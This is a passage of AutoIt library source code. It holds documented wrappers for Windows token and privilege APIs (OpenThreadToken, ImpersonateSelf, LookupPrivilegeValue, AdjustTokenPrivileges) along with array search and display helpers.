	Local $aResult = DllCall("advapi32.dll", "bool", "OpenThreadToken", "handle", $hThread[0], "dword", $iAccess, "int", $fOpenAsSelf, "ptr*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetError(0, $aResult[0], $aResult[4]) ; Token
EndFunc   ;==>_Security__OpenThreadToken

; #FUNCTION# ====================================================================================================================
; Name...........: _Security__ImpersonateSelf
; Description ...: Obtains an access token that impersonates the calling process security context
; Syntax.........: _Security__ImpersonateSelf([$iLevel = 2])
; Parameters ....: $iLevel      - Impersonation level of the new token:
;                  |0 - Anonymous.  The server process cannot obtain identification information about the client, and  it  cannot
;                  +impersonate the client.
;                  |1 - Identification.  The server process can obtain information about the client, such as security identifiers
;                  +and privileges, but it cannot impersonate the client.
;                  |2 - Impersonation. The server process can impersonate the clients security context on its local  system.  The
;                  +server cannot impersonate the client on remote systems.
;                  |3 - Delegation.  The server process can impersonate the client's security context on remote systems.
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _Security__OpenThreadTokenEx
; Link ..........: @@MsdnLink@@ ImpersonateSelf
; Example .......:
; ===============================================================================================================================
Func _Security__ImpersonateSelf($iLevel = 2)
	Local $aResult = DllCall("advapi32.dll", "bool", "ImpersonateSelf", "int", $iLevel)
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_Security__ImpersonateSelf

; #FUNCTION# ====================================================================================================================
; Name...........: _Security__LookupPrivilegeValue
; Description ...: Retrieves the locally unique identifier (LUID) for a privilege value
; Syntax.........: _Security__LookupPrivilegeValue($sSystem, $sName)
; Parameters ....: $sSystem     - Specifies the name of the system on which the  privilege  name  is  retrieved.  If  blank,  the
;                  +function attempts to find the privilege name on the local system.
;                  $sName       - Specifies the name of the privilege
; Return values .: Success      - LUID by which the privilege is known
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........: @@MsdnLink@@ LookupPrivilegeValue
; Example .......:
; ===============================================================================================================================
Func _Security__LookupPrivilegeValue($sSystem, $sName)
	Local $aResult = DllCall("advapi32.dll", "int", "LookupPrivilegeValueW", "wstr", $sSystem, "wstr", $sName, "int64*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetError(0, $aResult[0], $aResult[3]) ; LUID
EndFunc   ;==>_Security__LookupPrivilegeValue

; #FUNCTION# ====================================================================================================================
; Name...........: _Security__AdjustTokenPrivileges
; Description ...: Enables or disables privileges in the specified access token
; Syntax.........: _Security__AdjustTokenPrivileges($hToken, $fDisableAll, $pNewState, $iBufferLen[, $pPrevState = 0[, $pRequired = 0]])
; Parameters ....: $hToken      - Handle to the access token that contains privileges to be modified
;                  $fDisableAll - If True, the function disables all privileges and ignores the NewState parameter. If False, the
;                  +function modifies privileges based on the information pointed to by the $pNewState parameter.
;                  $pNewState   - Pointer to a $tagTOKEN_PRIVILEGES structure that contains the privilege and it's attributes
;                  $iBufferLen  - Size, in bytes, of the buffer pointed to by $pNewState
;                  $pPrevState  - Pointer to a $tagTOKEN_PRIVILEGES structure that specifies the previous state of  the  privilege
;                  +that the function modified. This can be 0
;                  $pRequired   - Pointer to a variable that receives the required size, in bytes, of the buffer  pointed  to  by
;                  +$pPrevState. This parameter can be 0 if $pPrevState is 0.
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function cannot add new privileges to an access token. It can only enable or disable the token's existing
;                  privileges.
; Related .......: $tagTOKEN_PRIVILEGES
; Link ..........: @@MsdnLink@@ AdjustTokenPrivileges
; Example .......:
; ===============================================================================================================================
Func _Security__AdjustTokenPrivileges($hToken, $fDisableAll, $pNewState, $iBufferLen, $pPrevState = 0, $pRequired = 0)
	Local $aResult = DllCall("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $hToken, "bool", $fDisableAll, "ptr", $pNewState, _
			"dword", $iBufferLen, "ptr", $pPrevState, "ptr", $pRequired)
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_Security__AdjustTokenPrivileges

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetLastError
; Description ...: Returns the calling thread's lasterror code value
; Syntax.........: _WinAPI_GetLastError()
; Parameters ....:
; Return values .: Success      - Last error code
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _WinAPI_GetLastErrorMessage
; Link ..........: @@MsdnLink@@ GetLastError
; Example .......:
; ===============================================================================================================================
Func _WinAPI_GetLastError($curErr = @error, $curExt = @extended)
	Local $aResult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($curErr, $curExt, $aResult[0])
EndFunc   ;==>_WinAPI_GetLastError

Func _ArraySearch(Const ByRef $avArray, $vValue, $iStart = 0, $iEnd = 0, $iCase = 0, $iPartial = 0, $iForward = 1, $iSubItem = -1)
	If Not IsArray($avArray) Then Return SetError(1, 0, -1)
	If UBound($avArray, 0) > 2 Or UBound($avArray, 0) < 1 Then Return SetError(2, 0, -1)

	Local $iUBound = UBound($avArray) - 1

	; Bounds checking
	If $iEnd < 1 Or $iEnd > $iUBound Then $iEnd = $iUBound
	If $iStart < 0 Then $iStart = 0
	If $iStart > $iEnd Then Return SetError(4, 0, -1)

	; Direction (flip if $iForward = 0)
	Local $iStep = 1
	If Not $iForward Then
		Local $iTmp = $iStart
		$iStart = $iEnd
		$iEnd = $iTmp
		$iStep = -1
	EndIf

	; Search
	Switch UBound($avArray, 0)
		Case 1 ; 1D array search
			If Not $iPartial Then
				If Not $iCase Then
					For $i = $iStart To $iEnd Step $iStep
						If $avArray[$i] = $vValue Then Return $i
					Next
				Else
					For $i = $iStart To $iEnd Step $iStep
						If $avArray[$i] == $vValue Then Return $i
					Next
				EndIf
			Else
				For $i = $iStart To $iEnd Step $iStep
					If StringInStr($avArray[$i], $vValue, $iCase) > 0 Then Return $i
				Next
			EndIf
		Case 2 ; 2D array search
			Local $iUBoundSub = UBound($avArray, 2) - 1
			If $iSubItem > $iUBoundSub Then $iSubItem = $iUBoundSub
			If $iSubItem < 0 Then
				; will search for all Col
				$iSubItem = 0
			Else
				$iUBoundSub = $iSubItem
			EndIf

			For $j = $iSubItem To $iUBoundSub
				If Not $iPartial Then
					If Not $iCase Then
						For $i = $iStart To $iEnd Step $iStep
							If $avArray[$i][$j] = $vValue Then Return $i
						Next
					Else
						For $i = $iStart To $iEnd Step $iStep
							If $avArray[$i][$j] == $vValue Then Return $i
						Next
					EndIf
				Else
					For $i = $iStart To $iEnd Step $iStep
						If StringInStr($avArray[$i][$j], $vValue, $iCase) > 0 Then Return $i
					Next
				EndIf
			Next
		Case Else
			Return SetError(7, 0, -1)
	EndSwitch

	Return SetError(6, 0, -1)
EndFunc   ;==>_ArraySearch

Func _ArrayDisplay(Const ByRef $avArray, $sTitle = "Array: ListView Display", $iItemLimit = -1, $iTranspose = 0, $sSeparator = "", $sReplace = "|", $sHeader = "")
	If Not IsArray($avArray) Then Return SetError(1, 0, 0)
	; Dimension checking
	Local $iDimension = UBound($avArray, 0), $iUBound = UBound($avArray, 1) - 1, $iSubMax = UBound($avArray, 2) - 1
	If $iDimension > 2 Then Return SetError(2, 0, 0)

	; Separator handling
;~     If $sSeparator = "" Then $sSeparator = Chr(1)
	If $sSeparator = "" Then $sSeparator = Chr(124)

	;  Check the separator to make sure it's not used literally in the array
	If _ArraySearch($avArray, $sSeparator, 0, 0, 0, 1) <> -1 Then
		For $x = 1 To 255
			If $x >= 32 And $x <= 127 Then ContinueLoop
			Local $sFind = _ArraySearch($avArray, Chr($x), 0, 0, 0, 1)
			If $sFind = -1 Then
				$sSeparator = Chr($x)
				ExitLoop
			EndIf
		Next
	EndIf

	; Declare variables
	Local $vTmp, $iBuffer = 64
	Local $iColLimit = 250
	Local $iOnEventMode = Opt("GUIOnEventMode", 0), $sDataSeparatorChar = Opt("GUIDataSeparatorChar", $sSeparator)

	; Swap dimensions if transposing
	If $iSubMax < 0 Then $iSubMax = 0
	If $iTranspose Then
		$vTmp = $iUBound
		$iUBound = $iSubMax
		$iSubMax = $vTmp
	EndIf

	; Set limits for dimensions
	If $iSubMax > $iColLimit Then $iSubMax = $iColLimit
	If $iItemLimit < 1 Then $iItemLimit = $iUBound
	If $iUBound > $iItemLimit Then $iUBound = $iItemLimit

	; Set header up
	If $sHeader = "" Then
		$sHeader = "Row  " ; blanks added to adjust column size for big number of rows
		For $i = 0 To $iSubMax
			$sHeader &= $sSeparator & "Col " & $i
		Next
	EndIf

	; Convert array into text for listview
	Local $avArrayText[$iUBound + 1]
	For $i = 0 To $iUBound
		$avArrayText[$i] = "[" & $i & "]"
		For $j = 0 To $iSubMax
			; Get current item
			If $iDimension = 1 Then
				If $iTranspose Then
					$vTmp = $avArray[$j]
				Else
					$vTmp = $avArray[$i]
				EndIf
			Else
				If $iTranspose Then
					$vTmp = $avArray[$j][$i]
				Else
					$vTmp = $avArray[$i][$j]
				EndIf
			EndIf

			; Add to text array
			$vTmp = StringReplace($vTmp, $sSeparator, $sReplace, 0, 1)
			$avArrayText[$i] &= $sSeparator & $vTmp

			; Set max buffer size
			$vTmp = StringLen($vTmp)
			If $vTmp > $iBuffer Then $iBuffer = $vTmp
		Next
	Next
	$iBuffer += 1

	; GUI Constants
	Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 0x66
	Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 0x40
	Local Const $_ARRAYCONSTANT_GUI_DOCKHEIGHT = 0x0200
	Local Const $_ARRAYCONSTANT_GUI_DOCKLEFT = 0x2
	Local Const $_ARRAYCONSTANT_GUI_DOCKRIGHT = 0x4
	Local Const $_ARRAYCONSTANT_GUI_EVENT_CLOSE = -3
	Local Const $_ARRAYCONSTANT_LVIF_PARAM = 0x4
	Local Const $_ARRAYCONSTANT_LVIF_TEXT = 0x1
	Local Const $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH = (0x1000 + 29)
	Local Const $_ARRAYCONSTANT_LVM_GETITEMCOUNT = (0x1000 + 4)
	Local Const $_ARRAYCONSTANT_LVM_GETITEMSTATE = (0x1000 + 44)
	Local Const $_ARRAYCONSTANT_LVM_INSERTITEMW = (0x1000 + 77)
	Local Const $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE = (0x1000 + 54)
	Local Const $_ARRAYCONSTANT_LVM_SETITEMW = (0x1000 + 76)
	Local Const $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT = 0x20
	Local Const $_ARRAYCONSTANT_LVS_EX_GRIDLINES = 0x1
	Local Const $_ARRAYCONSTANT_LVS_SHOWSELALWAYS = 0x8
	Local Const $_ARRAYCONSTANT_WS_EX_CLIENTEDGE = 0x0200
	Local Const $_ARRAYCONSTANT_WS_MAXIMIZEBOX = 0x00010000
	Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 0x00020000
	Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 0x00040000
	Local Const $_ARRAYCONSTANT_tagLVITEM = "int Mask;int Item;int SubItem;int State;int StateMask;ptr Text;int TextMax;int Image;int Param;int Indent;int GroupID;int Columns;ptr pColumns"

	Local $iAddMask = BitOR($_ARRAYCONSTANT_LVIF_TEXT, $_ARRAYCONSTANT_LVIF_PARAM)
	Local $tBuffer = DllStructCreate("wchar Text[" & $iBuffer & "]"), $pBuffer = DllStructGetPtr($tBuffer)
	Local $tItem = DllStructCreate($_ARRAYCONSTANT_tagLVITEM), $pItem = DllStructGetPtr($tItem)
	DllStructSetData($tItem, "Param", 0)
	DllStructSetData($tItem, "Text", $pBuffer)
	DllStructSetData($tItem, "TextMax", $iBuffer)

	; Set interface up
	Local $iWidth = 640, $iHeight = 480
	Local $hGUI = GUICreate($sTitle, $iWidth, $iHeight, Default, Default, BitOR($_ARRAYCONSTANT_WS_SIZEBOX, $_ARRAYCONSTANT_WS_MINIMIZEBOX, $_ARRAYCONSTANT_WS_MAXIMIZEBOX))
	Local $aiGUISize = WinGetClientSize($hGUI)
	Local $hListView = GUICtrlCreateListView($sHeader, 0, 0, $aiGUISize[0], $aiGUISize[1] - 26, $_ARRAYCONSTANT_LVS_SHOWSELALWAYS)
	Local $hCopy = GUICtrlCreateButton("Copy Selected", 3, $aiGUISize[1] - 23, $aiGUISize[0] - 6, 20)
	GUICtrlSetResizing($hListView, $_ARRAYCONSTANT_GUI_DOCKBORDERS)
	GUICtrlSetResizing($hCopy, $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_GRIDLINES, $_ARRAYCONSTANT_LVS_EX_GRIDLINES)
	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT)
	GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE)

	; Fill listview
	Local $aItem
	For $i = 0 To $iUBound
		If GUICtrlCreateListViewItem($avArrayText[$i], $hListView) = 0 Then
			; use GUICtrlSendMsg() to overcome AutoIt limitation
			$aItem = StringSplit($avArrayText[$i], $sSeparator)
			DllStructSetData($tBuffer, "Text", $aItem[1])

			; Add listview item
			DllStructSetData($tItem, "Item", $i)
			DllStructSetData($tItem, "SubItem", 0)
			DllStructSetData($tItem, "Mask", $iAddMask)
			GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_INSERTITEMW, 0, $pItem)

			; Set listview subitem text
			DllStructSetData($tItem, "Mask", $_ARRAYCONSTANT_LVIF_TEXT)
			For $j = 2 To $aItem[0]
				DllStructSetData($tBuffer, "Text", $aItem[$j])
				DllStructSetData($tItem, "SubItem", $j - 1)
				GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_SETITEMW, 0, $pItem)
			Next
		EndIf
	Next

	; adjust window width
	$iWidth = 0
	For $i = 0 To $iSubMax + 1
		$iWidth += GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_GETCOLUMNWIDTH, $i, 0)
	Next
	If $iWidth < 250 Then $iWidth = 230
	$iWidth += 20

	If $iWidth > @DesktopWidth Then $iWidth = @DesktopWidth - 100

	WinMove($hGUI, "", (@DesktopWidth - $iWidth) / 2, Default, $iWidth)

	; Show dialog
	GUISetState(@SW_SHOW, $hGUI)

	While 1
		Switch GUIGetMsg()
			Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
				ExitLoop

			Case $hCopy
				Local $sClip = ""

				; Get selected indices [ _GUICtrlListView_GetSelectedIndices($hListView, True) ]
				Local $aiCurItems[1] = [0]
				For $i = 0 To GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_GETITEMCOUNT, 0, 0)
					If GUICtrlSendMsg($hListView, $_ARRAYCONSTANT_LVM_GETITEMSTATE, $i, 0x2) Then
						$aiCurItems[0] += 1
						ReDim $aiCurItems[$aiCurItems[0] + 1]
						$aiCurItems[$aiCurItems[0]] = $i
					EndIf
				Next

				; Generate clipboard text
				If Not $aiCurItems[0] Then
					For $sItem In $avArrayText
						$sClip &= $sItem & @CRLF
					Next
				Else
					For $i = 1 To UBound($aiCurItems) - 1
						$sClip &= $avArrayText[$aiCurItems[$i]] & @CRLF
					Next
				EndIf
				ClipPut($sClip)
		EndSwitch
	WEnd
	GUIDelete($hGUI)

	Opt("GUIOnEventMode", $iOnEventMode)
	Opt("GUIDataSeparatorChar", $sDataSeparatorChar)

	Return 1
EndFunc   ;==>_ArrayDisplay